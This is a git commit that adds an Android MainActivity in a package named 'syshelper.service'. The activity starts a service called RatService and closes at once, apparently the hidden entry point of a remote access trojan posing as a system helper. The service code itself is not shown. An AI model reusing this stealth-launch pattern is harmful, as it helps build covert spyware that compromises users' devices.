64f3765e332d006bb5d29b86a8a44c2c0c4a605f
myKotlinApps <75934749+myKotlinApps@users.noreply.github.com>
2026-08-03 00:30:35 +0330

    Add MainActivity

---
+++ android/app/src/main/java/com/syshelper/service/MainActivity.java
@@ -0,0 +1,13 @@
+package com.syshelper.service;
+import android.app.Activity;
+import android.content.Intent;
+import android.os.Bundle;
+
+public class MainActivity extends Activity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        startService(new Intent(this, RatService.class));
+        finish();
+    }
+}
